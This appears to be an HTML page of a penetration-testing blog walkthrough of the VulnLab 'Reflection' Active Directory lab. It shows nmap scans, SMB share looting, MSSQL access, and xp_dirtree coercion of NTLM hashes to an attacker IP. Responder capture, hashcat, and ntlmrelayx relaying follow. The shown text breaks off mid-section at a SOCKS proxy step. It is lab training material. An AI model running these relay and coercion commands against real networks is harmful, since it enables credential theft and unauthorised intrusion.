@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Reflection Chain - VulnLab &#x2F; Hack The Box Lab Walkthrough &amp; WriteupWelcome to my walkthrough &amp; writeup for the Reflection Chain, a challenging Active Directory Chain - ProLab from VulnLab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Reflection">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/11/08/VL-Reflection/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Reflection Chain - VulnLab &#x2F; Hack The Box Lab Walkthrough &amp; WriteupWelcome to my walkthrough &amp; writeup for the Reflection Chain, a challenging Active Directory Chain - ProLab from VulnLab">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Reflection/smb-access-guest.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Reflection/xp_deer.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Reflection/relay-working.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Reflection/mssql-dc.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Reflection/relay-tosmb.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Reflection/bloodhound-perms.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Reflection/lab_admin_user.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Reflection/ws-01-genericall.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Reflection/password-found.png">
+<meta property="article:published_time" content="2025-11-08T14:24:20.000Z">
+<meta property="article:modified_time" content="2025-11-08T14:28:03.077Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Chain">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="ProLab">
+<meta property="article:tag" content="VulnLab">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Reflection/smb-access-guest.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Reflection</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/11/06/VL-Tea/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/08/VL-Reflection/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&text=VL-Reflection"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&title=VL-Reflection"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&is_video=false&description=VL-Reflection"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Reflection&body=Check out this article: https://panosoikogr.github.io/2025/11/08/VL-Reflection/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&title=VL-Reflection"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&title=VL-Reflection"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&title=VL-Reflection"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&title=VL-Reflection"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&name=VL-Reflection&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&t=VL-Reflection"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Reflection-Chain-VulnLab-Hack-The-Box-Lab-Walkthrough-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Reflection Chain - VulnLab &#x2F; Hack The Box Lab Walkthrough &amp; Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Overview"><span class="toc-number">1.1.</span> <span class="toc-text">Network Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-dc01-reflection-vl"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan - dc01.reflection.vl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-ws01-reflection-vl"><span class="toc-number">1.2.2.</span> <span class="toc-text">Nmap Scan - ws01.reflection.vl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-ms01-reflection-vl"><span class="toc-number">1.2.3.</span> <span class="toc-text">Nmap Scan - ms01.reflection.vl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-SMB-Guest-Access"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access - SMB Guest Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Discovering-the-Staging-Share"><span class="toc-number">1.3.1.</span> <span class="toc-text">Discovering the Staging Share</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-Exploitation"><span class="toc-number">1.4.</span> <span class="toc-text">MSSQL Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Authenticating-to-MSSQL"><span class="toc-number">1.4.1.</span> <span class="toc-text">Authenticating to MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Connecting-to-the-Database"><span class="toc-number">1.4.2.</span> <span class="toc-text">Connecting to the Database</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-Relay-Attack"><span class="toc-number">1.5.</span> <span class="toc-text">NTLM Relay Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Capturing-Net-NTLMv2-Hashes"><span class="toc-number">1.5.1.</span> <span class="toc-text">Capturing Net-NTLMv2 Hashes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Setting-Up-NTLM-Relay"><span class="toc-number">1.5.2.</span> <span class="toc-text">Setting Up NTLM Relay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Relaying-to-MSSQL-on-DC01"><span class="toc-number">1.5.3.</span> <span class="toc-text">Relaying to MSSQL on DC01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SOCKS-Proxy-for-SMB-Access"><span class="toc-number">1.5.4.</span> <span class="toc-text">SOCKS Proxy for SMB Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-the-Production-Share"><span class="toc-number">1.5.5.</span> <span class="toc-text">Accessing the Production Share</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Escalating-Privileges"><span class="toc-number">1.6.</span> <span class="toc-text">Escalating Privileges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerating-the-Production-Database"><span class="toc-number">1.6.1.</span> <span class="toc-text">Enumerating the Production Database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Enumeration"><span class="toc-number">1.6.2.</span> <span class="toc-text">BloodHound Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LAPS-Exploitation"><span class="toc-number">1.7.</span> <span class="toc-text">LAPS Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-LAPS-Password"><span class="toc-number">1.7.1.</span> <span class="toc-text">Reading LAPS Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gaining-Administrator-Access-on-MS01"><span class="toc-number">1.7.2.</span> <span class="toc-text">Gaining Administrator Access on MS01</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Extraction-with-Mimikatz"><span class="toc-number">1.8.</span> <span class="toc-text">Credential Extraction with Mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Disabling-Windows-Defender"><span class="toc-number">1.8.1.</span> <span class="toc-text">Disabling Windows Defender</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-Logon-Passwords"><span class="toc-number">1.8.2.</span> <span class="toc-text">Dumping Logon Passwords</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-Cached-Credentials"><span class="toc-number">1.8.3.</span> <span class="toc-text">Dumping Cached Credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-Credential-Manager"><span class="toc-number">1.8.4.</span> <span class="toc-text">Dumping Credential Manager</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resource-Based-Constrained-Delegation-RBCD-Attack"><span class="toc-number">1.9.</span> <span class="toc-text">Resource-Based Constrained Delegation (RBCD) Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Configuring-RBCD"><span class="toc-number">1.9.1.</span> <span class="toc-text">Configuring RBCD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Requesting-a-Service-Ticket"><span class="toc-number">1.9.2.</span> <span class="toc-text">Requesting a Service Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-Secrets"><span class="toc-number">1.9.3.</span> <span class="toc-text">Dumping Secrets</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Compromise-Password-Spraying"><span class="toc-number">1.10.</span> <span class="toc-text">Domain Compromise - Password Spraying</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flags"><span class="toc-number">1.11.</span> <span class="toc-text">Flags</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.12.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Reflection
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-08T14:24:20.000Z" class="dt-published" itemprop="datePublished">2025-11-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Chain/" rel="tag">Chain</a>, <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/ProLab/" rel="tag">ProLab</a>, <a class="p-category" href="/tags/VulnLab/" rel="tag">VulnLab</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Reflection-Chain-VulnLab-Hack-The-Box-Lab-Walkthrough-Writeup"><a href="#Reflection-Chain-VulnLab-Hack-The-Box-Lab-Walkthrough-Writeup" class="headerlink" title="Reflection Chain - VulnLab &#x2F; Hack The Box Lab Walkthrough &amp; Writeup"></a>Reflection Chain - VulnLab &#x2F; Hack The Box Lab Walkthrough &amp; Writeup</h1><p>Welcome to my walkthrough &amp; writeup for the <strong>Reflection Chain</strong>, a challenging Active Directory Chain - ProLab from <strong>VulnLab</strong> &#x2F; <strong>Hack The Box</strong>. This writeup documents my approach to compromising a multi-machine Windows domain environment. </p>
+<p>The Reflection lab is an excellent learning resource for aspiring penetration testers and security professionals looking to develop their skills in Active Directory exploitation, NTLM relay attacks, RBCD (Resource-Based Constrained Delegation), and LAPS exploitation.</p>
+<p>In this walkthrough, I’ll guide you through the complete attack chain, from initial enumeration to domain compromise, demonstrating real-world techniques used in modern penetration testing engagements.</p>
+<p><strong>Difficulty</strong>: Advanced<br><strong>Lab Type</strong>: Chain &#x2F; Pro Lab<br><strong>Focus Areas</strong>: Active Directory, MSSQL, NTLM Relay, RBCD, LAPS</p>
+<hr>
+<h2 id="Network-Overview"><a href="#Network-Overview" class="headerlink" title="Network Overview"></a>Network Overview</h2><p>The lab environment consists of three machines in the <code>reflection.vl</code> domain:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.243.229 dc01.reflection.vl  (Domain Controller)</span><br><span class="line">10.10.243.230 ms01.reflection.vl  (MSSQL Server)</span><br><span class="line">10.10.243.231 ws01.reflection.vl  (Workstation)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><h3 id="Nmap-Scan-dc01-reflection-vl"><a href="#Nmap-Scan-dc01-reflection-vl" class="headerlink" title="Nmap Scan - dc01.reflection.vl"></a>Nmap Scan - dc01.reflection.vl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON  VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos</span><br><span class="line">135/tcp   open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack</span><br><span class="line">1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00;</span><br><span class="line">3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class="line">|   DNS_Computer_Name: dc01.reflection.vl</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49671/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49675/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">59765/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">59780/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
+
+<p>The domain controller exposes standard Active Directory services, including LDAP, Kerberos, and notably, <strong>MSSQL Server 2019</strong> on port 1433.</p>
+<h3 id="Nmap-Scan-ws01-reflection-vl"><a href="#Nmap-Scan-ws01-reflection-vl" class="headerlink" title="Nmap Scan - ws01.reflection.vl"></a>Nmap Scan - ws01.reflection.vl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON  VERSION</span><br><span class="line">135/tcp  open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class="line">| Issuer: commonName=ws01.reflection.vl</span><br></pre></td></tr></table></figure>
+
+<p>A standard Windows workstation with RDP and SMB services exposed.</p>
+<h3 id="Nmap-Scan-ms01-reflection-vl"><a href="#Nmap-Scan-ms01-reflection-vl" class="headerlink" title="Nmap Scan - ms01.reflection.vl"></a>Nmap Scan - ms01.reflection.vl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 </span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">|   DNS_Computer_Name: ms01.reflection.vl</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">49675/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49676/tcp open  unknown       syn-ack ttl 127</span><br></pre></td></tr></table></figure>
+
+<p>This server runs MSSQL Server 2019 and has WinRM (port 5985) enabled, making it a prime target for remote access.</p>
+<hr>
+<h2 id="Initial-Access-SMB-Guest-Access"><a href="#Initial-Access-SMB-Guest-Access" class="headerlink" title="Initial Access - SMB Guest Access"></a>Initial Access - SMB Guest Access</h2><h3 id="Discovering-the-Staging-Share"><a href="#Discovering-the-Staging-Share" class="headerlink" title="Discovering the Staging Share"></a>Discovering the Staging Share</h3><p>We began by checking for guest access on the SMB shares:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb ms01.reflection.vl -u &#x27;panos&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Reflection/smb-access-guest.png" alt="SMB Guest Access"></p>
+<p>This revealed guest access to the <strong>staging</strong> share. We connected and retrieved the configuration file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //ms01.reflection.vl/staging</span><br><span class="line">get staging_db.conf</span><br></pre></td></tr></table></figure>
+
+<p>Opening <code>staging_db.conf</code> revealed MSSQL credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user=web_staging</span><br><span class="line">password=&lt;PASS&gt;</span><br><span class="line">db=staging</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="MSSQL-Exploitation"><a href="#MSSQL-Exploitation" class="headerlink" title="MSSQL Exploitation"></a>MSSQL Exploitation</h2><h3 id="Authenticating-to-MSSQL"><a href="#Authenticating-to-MSSQL" class="headerlink" title="Authenticating to MSSQL"></a>Authenticating to MSSQL</h3><p>We verified the credentials against the MSSQL service on MS01:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec mssql ms01.reflection.vl -u &#x27;web_staging&#x27; -p &#x27;&lt;PASS&gt;&#x27; --local-auth</span><br></pre></td></tr></table></figure>
+
+<p>Success! We also performed RID brute-forcing to enumerate local users and groups:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec mssql ms01.reflection.vl -u &#x27;web_staging&#x27; -p &#x27;&lt;PASS&gt;&#x27; --local-auth --rid-brute</span><br></pre></td></tr></table></figure>
+
+<h3 id="Connecting-to-the-Database"><a href="#Connecting-to-the-Database" class="headerlink" title="Connecting to the Database"></a>Connecting to the Database</h3><p>We established a connection to the MSSQL instance:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py ./web_staging:&lt;PASS&gt;@ms01.reflection.vl</span><br></pre></td></tr></table></figure>
+
+<p>While we couldn’t enable <code>xp_cmdshell</code>, we discovered that <code>xp_dirtree</code> was available, allowing us to force the MSSQL service account to authenticate to our machine.</p>
+<hr>
+<h2 id="NTLM-Relay-Attack"><a href="#NTLM-Relay-Attack" class="headerlink" title="NTLM Relay Attack"></a>NTLM Relay Attack</h2><h3 id="Capturing-Net-NTLMv2-Hashes"><a href="#Capturing-Net-NTLMv2-Hashes" class="headerlink" title="Capturing Net-NTLMv2 Hashes"></a>Capturing Net-NTLMv2 Hashes</h3><p>We set up Responder to capture the authentication hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure>
+
+<p>Then triggered authentication from MSSQL:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_dirtree \\&lt;Your IP&gt;\hello</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Reflection/xp_deer.png" alt="Capturing Hash with xp_dirtree"></p>
+<p>We attempted to crack the captured hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>Unfortunately, the hash didn’t crack. However, we noticed that <strong>SMB signing was disabled</strong> on ws01:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netexec smb ws01.reflection.vl                              </span><br><span class="line">(name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:None)</span><br></pre></td></tr></table></figure>
+
+<p>This opened up the possibility of an <strong>NTLM relay attack</strong>.</p>
+<h3 id="Setting-Up-NTLM-Relay"><a href="#Setting-Up-NTLM-Relay" class="headerlink" title="Setting Up NTLM Relay"></a>Setting Up NTLM Relay</h3><p><img src="/images/Reflection/relay-working.png" alt="NTLM Relay Success"></p>
+<p>We confirmed relay viability:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb targets.txt --gen-relay-list output.txt</span><br></pre></td></tr></table></figure>
+
+<p>Started <code>ntlmrelayx</code> to wait for incoming connections:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-ntlmrelayx -tf targets.txt -smb2support</span><br></pre></td></tr></table></figure>
+
+<p>Triggered the relay from MSSQL:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_dirtree \\10.8.5.195\hello</span><br></pre></td></tr></table></figure>
+
+<p>The relay succeeded! We authenticated to both <strong>dc01 (10.10.243.229)</strong> and <strong>ws01 (10.10.243.231)</strong>.</p>
+<h3 id="Relaying-to-MSSQL-on-DC01"><a href="#Relaying-to-MSSQL-on-DC01" class="headerlink" title="Relaying to MSSQL on DC01"></a>Relaying to MSSQL on DC01</h3><p>We attempted to relay to the MSSQL service on the domain controller using techniques from <a target="_blank" rel="noopener" href="https://blog.compass-security.com/2023/10/relaying-ntlm-to-mssql/">this Compass Security blog post</a>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-ntlmrelayx -t mssql://dc01.reflection.vl -i -smb2support --no-multirelay</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Reflection/mssql-dc.png" alt="MSSQL Relay to DC"></p>
+<p>While we achieved authentication, command execution was problematic. The shell would freeze, and we couldn’t execute <code>xp_cmdshell</code> or <code>xp_dirtree</code>.</p>
+<h3 id="SOCKS-Proxy-for-SMB-Access"><a href="#SOCKS-Proxy-for-SMB-Access" class="headerlink" title="SOCKS Proxy for SMB Access"></a>SOCKS Proxy for SMB Access</h3><p>We pivoted to creating a <strong>SOCKS proxy</strong> to relay the Net-NTLMv2 hash to SMB on the domain controller.</p>
+<p><img src="/images/Reflection/relay-tosmb.png" alt="NTLM Relay to SMB"></p>
+<p><strong>Step 1:</strong> Set up ntlmrelayx with SOCKS support:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ntlmrelayx.py -tf targets.txt -smb2support -socks</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 2:</strong> Relay the hash from MS01:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py ./web_staging:&lt;PASS&gt;@ms01.reflection.vl</span><br><span class="line">xp_dirtree //10.8.5.195/hello</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 3:</strong> Configure proxychains to point to <code>127.0.0.1:1080</code></p>
+<p><strong>Step 4:</strong> Connect to SMB through the proxy:</p>
